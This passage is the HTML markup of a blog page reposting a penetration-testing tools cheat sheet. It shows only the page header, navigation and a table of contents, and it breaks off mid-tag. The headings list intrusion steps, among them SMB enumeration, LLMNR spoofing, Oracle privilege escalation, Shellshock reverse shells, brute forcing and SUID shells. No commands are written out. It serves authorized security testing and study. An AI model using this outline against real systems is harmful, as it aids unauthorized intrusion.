<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="IntroductionPenetration testing tools cheat sheet, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level">
<meta name="keywords" content="Hacking,Penetration,转载">
<meta property="og:type" content="article">
<meta property="og:title" content="Cheat Sheet Penetration Testing Tools">
<meta property="og:url" content="http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/index.html">
<meta property="og:site_name" content="ZMarvel">
<meta property="og:description" content="IntroductionPenetration testing tools cheat sheet, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-03-02T15:20:34.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Cheat Sheet Penetration Testing Tools">
<meta name="twitter:description" content="IntroductionPenetration testing tools cheat sheet, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Cheat Sheet Penetration Testing Tools</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/project/">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/02/SecLists/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/01/WEB应用常见安全漏洞一览/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&text=Cheat Sheet Penetration Testing Tools"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&title=Cheat Sheet Penetration Testing Tools"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&is_video=false&description=Cheat Sheet Penetration Testing Tools"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cheat Sheet Penetration Testing Tools&body=Check out this article: http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&title=Cheat Sheet Penetration Testing Tools"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&title=Cheat Sheet Penetration Testing Tools"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&title=Cheat Sheet Penetration Testing Tools"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&title=Cheat Sheet Penetration Testing Tools"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.okoksec.com/2019/03/02/Cheat-Sheet-Penetration-Testing-Tools/&name=Cheat Sheet Penetration Testing Tools&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-engagement"><span class="toc-number">2.</span> <span class="toc-text">Pre-engagement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Configuration"><span class="toc-number">2.1.</span> <span class="toc-text">Network Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Set-IP-Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">Set IP Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Subnetting"><span class="toc-number">2.1.2.</span> <span class="toc-text">Subnetting</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Passive-Information-Gathering"><span class="toc-number">3.1.</span> <span class="toc-text">Passive Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS"><span class="toc-number">3.1.1.</span> <span class="toc-text">DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WHOIS-enumeration"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">WHOIS enumeration</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-DNS-IP-Lookup"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">Perform DNS IP Lookup</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-MX-Record-Lookup"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">Perform MX Record Lookup</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-Zone-Transfer-with-DIG"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">Perform Zone Transfer with DIG</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Zone-Transfers"><span class="toc-number">4.</span> <span class="toc-text">DNS Zone Transfers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Email"><span class="toc-number">4.0.1.</span> <span class="toc-text">Email</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Simply-Email"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">Simply Email</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Semi-Active-Information-Gathering"><span class="toc-number">4.1.</span> <span class="toc-text">Semi Active Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Basic-Finger-Printing"><span class="toc-number">4.1.1.</span> <span class="toc-text">Basic Finger Printing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Banner-grabbing-with-NC"><span class="toc-number">4.1.2.</span> <span class="toc-text">Banner grabbing with NC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Information-Gathering"><span class="toc-number">4.2.</span> <span class="toc-text">Active Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Bruteforce"><span class="toc-number">4.2.1.</span> <span class="toc-text">DNS Bruteforce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSRecon"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">DNSRecon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">4.2.2.</span> <span class="toc-text">Port Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Nmap-Commands"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">Nmap Commands</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Nmap-UDP-Scanning"><span class="toc-number">4.2.2.1.1.</span> <span class="toc-text">Nmap UDP Scanning</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UDP-Protocol-Scanner"><span class="toc-number">4.2.2.1.2.</span> <span class="toc-text">UDP Protocol Scanner</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Other-Host-Discovery"><span class="toc-number">4.2.2.1.3.</span> <span class="toc-text">Other Host Discovery</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-amp-Attacking-Network-Services"><span class="toc-number">5.</span> <span class="toc-text">Enumeration & Attacking Network Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SAMB-SMB-Windows-Domain-Enumeration"><span class="toc-number">5.1.</span> <span class="toc-text">SAMB / SMB / Windows Domain Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Samba-Enumeration"><span class="toc-number">5.1.1.</span> <span class="toc-text">Samba Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB-Enumeration-Tools"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">SMB Enumeration Tools</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fingerprint-SMB-Version"><span class="toc-number">5.1.1.2.</span> <span class="toc-text">Fingerprint SMB Version</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Find-open-SMB-Shares"><span class="toc-number">5.1.1.3.</span> <span class="toc-text">Find open SMB Shares</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Enumerate-SMB-Users"><span class="toc-number">5.1.1.4.</span> <span class="toc-text">Enumerate SMB Users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Manual-Null-session-testing"><span class="toc-number">5.1.1.5.</span> <span class="toc-text">Manual Null session testing:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NBTScan-unixwiz"><span class="toc-number">5.1.1.6.</span> <span class="toc-text">NBTScan unixwiz</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBT-NS-Spoofing"><span class="toc-number">5.2.</span> <span class="toc-text">LLMNR / NBT-NS Spoofing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Metasploit-LLMNR-NetBIOS-requests"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">Metasploit LLMNR / NetBIOS requests</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Responder-py"><span class="toc-number">5.2.1.</span> <span class="toc-text">Responder.py</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Run-Responder-py-for-the-whole-engagement"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">Run Responder.py for the whole engagement</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-Enumeration-Tools"><span class="toc-number">5.3.</span> <span class="toc-text">SNMP Enumeration Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SNMPv3-Enumeration-Tools"><span class="toc-number">5.3.1.</span> <span class="toc-text">SNMPv3 Enumeration Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Use-Metasploits-Wordlist"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">Use Metasploits Wordlist</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-Services-Enumeration"><span class="toc-number">5.4.</span> <span class="toc-text">R Services Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSH-Enumeration"><span class="toc-number">5.4.1.</span> <span class="toc-text">RSH Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RSH-Run-Commands"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">RSH Run Commands</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Metasploit-RSH-Login-Scanner"><span class="toc-number">5.4.1.2.</span> <span class="toc-text">Metasploit RSH Login Scanner</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rusers-Show-Logged-in-Users"><span class="toc-number">5.4.1.3.</span> <span class="toc-text">rusers Show Logged in Users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rusers-scan-whole-Subnet"><span class="toc-number">5.4.1.4.</span> <span class="toc-text">rusers scan whole Subnet</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finger-Enumeration"><span class="toc-number">5.5.</span> <span class="toc-text">Finger Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Finger-a-Specific-Username"><span class="toc-number">5.5.1.</span> <span class="toc-text">Finger a Specific Username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solaris-bug-that-shows-all-logged-in-users"><span class="toc-number">5.5.2.</span> <span class="toc-text">Solaris bug that shows all logged in users:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rwho"><span class="toc-number">5.6.</span> <span class="toc-text">rwho</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS-amp-SSL-Testing"><span class="toc-number">6.</span> <span class="toc-text">TLS & SSL Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#testssl-sh"><span class="toc-number">6.1.</span> <span class="toc-text">testssl.sh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Assessment"><span class="toc-number">7.</span> <span class="toc-text">Vulnerability Assessment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-Penetration-Testing"><span class="toc-number">8.</span> <span class="toc-text">Database Penetration Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle"><span class="toc-number">8.1.</span> <span class="toc-text">Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fingerprint-Oracle-TNS-Version"><span class="toc-number">8.1.1.</span> <span class="toc-text">Fingerprint Oracle TNS Version</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Brute-force-oracle-user-accounts"><span class="toc-number">8.1.2.</span> <span class="toc-text">Brute force oracle user accounts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-Privilege-Escalation"><span class="toc-number">8.1.3.</span> <span class="toc-text">Oracle Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Identify-default-accounts-within-oracle-db-using-NMAP-NSE-scripts"><span class="toc-number">8.1.3.1.</span> <span class="toc-text">Identify default accounts within oracle db using NMAP NSE scripts:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#How-to-identify-the-current-privilege-level-for-an-oracle-user"><span class="toc-number">8.1.3.2.</span> <span class="toc-text">How to identify the current privilege level for an oracle user:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle-priv-esc-and-obtain-DBA-access"><span class="toc-number">8.1.3.3.</span> <span class="toc-text">Oracle priv esc and obtain DBA access:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Run-the-exploit-with-a-select-query"><span class="toc-number">8.1.3.4.</span> <span class="toc-text">Run the exploit with a select query:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Remove-the-exploit-using"><span class="toc-number">8.1.3.5.</span> <span class="toc-text">Remove the exploit using:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Get-Oracle-Reverse-os-shell"><span class="toc-number">8.1.3.6.</span> <span class="toc-text">Get Oracle Reverse os-shell:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-number">8.2.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Use-MS-SQL-Servers-Browse-For-More"><span class="toc-number">8.2.0.1.</span> <span class="toc-text">Use MS SQL Servers Browse For More</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bruteforce-MSSQL-Login"><span class="toc-number">8.2.1.</span> <span class="toc-text">Bruteforce MSSQL Login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-MSSQL-Shell"><span class="toc-number">8.2.2.</span> <span class="toc-text">Metasploit MSSQL Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network"><span class="toc-number">9.</span> <span class="toc-text">Network</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Plink-exe-Tunnel"><span class="toc-number">9.1.</span> <span class="toc-text">Plink.exe Tunnel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivoting"><span class="toc-number">9.2.</span> <span class="toc-text">Pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-Pivoting"><span class="toc-number">9.2.1.</span> <span class="toc-text">SSH Pivoting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-Pivoting"><span class="toc-number">9.2.2.</span> <span class="toc-text">Meterpreter Pivoting</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TTL-Finger-Printing"><span class="toc-number">9.3.</span> <span class="toc-text">TTL Finger Printing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPv4-Cheat-Sheets"><span class="toc-number">9.4.</span> <span class="toc-text">IPv4 Cheat Sheets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Classful-IP-Ranges"><span class="toc-number">9.4.1.</span> <span class="toc-text">Classful IP Ranges</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv4-Private-Address-Ranges"><span class="toc-number">9.4.2.</span> <span class="toc-text">IPv4 Private Address Ranges</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv4-Subnet-Cheat-Sheet"><span class="toc-number">9.4.3.</span> <span class="toc-text">IPv4 Subnet Cheat Sheet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VLAN-Hopping"><span class="toc-number">9.5.</span> <span class="toc-text">VLAN Hopping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VPN-Pentesting-Tools"><span class="toc-number">9.6.</span> <span class="toc-text">VPN Pentesting Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IKEForce"><span class="toc-number">9.6.1.</span> <span class="toc-text">IKEForce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IKE-Aggressive-Mode-PSK-Cracking"><span class="toc-number">9.6.2.</span> <span class="toc-text">IKE Aggressive Mode PSK Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-1-Idenitfy-IKE-Servers"><span class="toc-number">9.6.2.1.</span> <span class="toc-text">Step 1: Idenitfy IKE Servers</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-2-Enumerate-group-name-with-IKEForce"><span class="toc-number">9.6.2.2.</span> <span class="toc-text">Step 2: Enumerate group name with IKEForce</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-3-Use-ike-scan-to-capture-the-PSK-hash"><span class="toc-number">9.6.2.3.</span> <span class="toc-text">Step 3: Use ike-scan to capture the PSK hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-4-Use-psk-crack-to-crack-the-PSK-hash"><span class="toc-number">9.6.2.4.</span> <span class="toc-text">Step 4: Use psk-crack to crack the PSK hash</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PPTP-Hacking"><span class="toc-number">9.6.3.</span> <span class="toc-text">PPTP Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NMAP-PPTP-Fingerprint"><span class="toc-number">9.6.3.1.</span> <span class="toc-text">NMAP PPTP Fingerprint:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PPTP-Dictionary-Attack"><span class="toc-number">9.6.3.2.</span> <span class="toc-text">PPTP Dictionary Attack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Tunneling"><span class="toc-number">9.7.</span> <span class="toc-text">DNS Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Attacking-Machine"><span class="toc-number">9.7.1.</span> <span class="toc-text">Attacking Machine</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Exploit"><span class="toc-number">10.</span> <span class="toc-text">BOF / Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Research"><span class="toc-number">11.</span> <span class="toc-text">Exploit Research</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-Exploits"><span class="toc-number">11.1.</span> <span class="toc-text">Searching for Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compiling-Windows-Exploits-on-Kali"><span class="toc-number">11.2.</span> <span class="toc-text">Compiling Windows Exploits on Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cross-Compiling-Exploits"><span class="toc-number">11.3.</span> <span class="toc-text">Cross Compiling Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-Common-Vulnerabilities"><span class="toc-number">11.4.</span> <span class="toc-text">Exploiting Common Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploiting-Shellshock"><span class="toc-number">11.4.1.</span> <span class="toc-text">Exploiting Shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cat-file-view-file-contents"><span class="toc-number">11.4.1.1.</span> <span class="toc-text">cat file (view file contents)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shell-Shock-run-bind-shell"><span class="toc-number">11.4.1.2.</span> <span class="toc-text">Shell Shock run bind shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shell-Shock-reverse-Shell"><span class="toc-number">11.4.1.3.</span> <span class="toc-text">Shell Shock reverse Shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Local-Web-Servers"><span class="toc-number">12.</span> <span class="toc-text">Simple Local Web Servers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mounting-File-Shares"><span class="toc-number">13.</span> <span class="toc-text">Mounting File Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-HTTPS-Webserver-Enumeration"><span class="toc-number">14.</span> <span class="toc-text">HTTP / HTTPS Webserver Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Packet-Inspection"><span class="toc-number">15.</span> <span class="toc-text">Packet Inspection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Username-Enumeration"><span class="toc-number">16.</span> <span class="toc-text">Username Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-User-Enumeration"><span class="toc-number">16.1.</span> <span class="toc-text">SMB User Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-User-Enumeration"><span class="toc-number">16.2.</span> <span class="toc-text">SNMP User Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Passwords"><span class="toc-number">17.</span> <span class="toc-text">Passwords</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wordlists"><span class="toc-number">17.1.</span> <span class="toc-text">Wordlists</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Forcing-Services"><span class="toc-number">18.</span> <span class="toc-text">Brute Forcing Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-FTP-Brute-Force"><span class="toc-number">18.1.</span> <span class="toc-text">Hydra FTP Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-POP3-Brute-Force"><span class="toc-number">18.2.</span> <span class="toc-text">Hydra POP3 Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-SMTP-Brute-Force"><span class="toc-number">18.3.</span> <span class="toc-text">Hydra SMTP Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">19.</span> <span class="toc-text">Password Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#John-The-Ripper-JTR"><span class="toc-number">19.1.</span> <span class="toc-text">John The Ripper - JTR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Penetration-Testing-Commands"><span class="toc-number">20.</span> <span class="toc-text">Windows Penetration Testing Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Penetration-Testing-Commands"><span class="toc-number">21.</span> <span class="toc-text">Linux Penetration Testing Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compiling-Exploits"><span class="toc-number">22.</span> <span class="toc-text">Compiling Exploits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-if-C-code-is-for-Windows-or-Linux"><span class="toc-number">22.1.</span> <span class="toc-text">Identifying if C code is for Windows or Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Build-Exploit-GCC"><span class="toc-number">22.2.</span> <span class="toc-text">Build Exploit GCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GCC-Compile-32Bit-Exploit-on-64Bit-Kali"><span class="toc-number">22.3.</span> <span class="toc-text">GCC Compile 32Bit Exploit on 64Bit Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-Windows-exe-on-Linux"><span class="toc-number">22.4.</span> <span class="toc-text">Compile Windows .exe on Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID-Binary"><span class="toc-number">23.</span> <span class="toc-text">SUID Binary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-C-Shell-for-bin-bash"><span class="toc-number">23.1.</span> <span class="toc-text">SUID C Shell for /bin/bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-C-Shell-for-bin-sh"><span class="toc-number">23.2.</span> <span class="toc-text">SUID C Shell for /bin/sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-SUID-Shell-binary"><span class="toc-number">23.3.</span> <span class="toc-text">Building the SUID Shell binary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shells"><span class="toc-number">24.</span> <span class="toc-text">Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TTY-Shells"><span class="toc-number">25.</span> <span class="toc-text">TTY Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-TTY-Shell-Trick"><span class="toc-number">25.1.</span> <span class="toc-text">Python TTY Shell Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Interactive-sh-shell"><span class="toc-number">25.2.</span> <span class="toc-text">Spawn Interactive sh shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Perl-TTY-Shell"><span class="toc-number">25.3.</span> <span class="toc-text">Spawn Perl TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Ruby-TTY-Shell"><span class="toc-number">25.4.</span> <span class="toc-text">Spawn Ruby TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Lua-TTY-Shell"><span class="toc-number">25.5.</span> <span 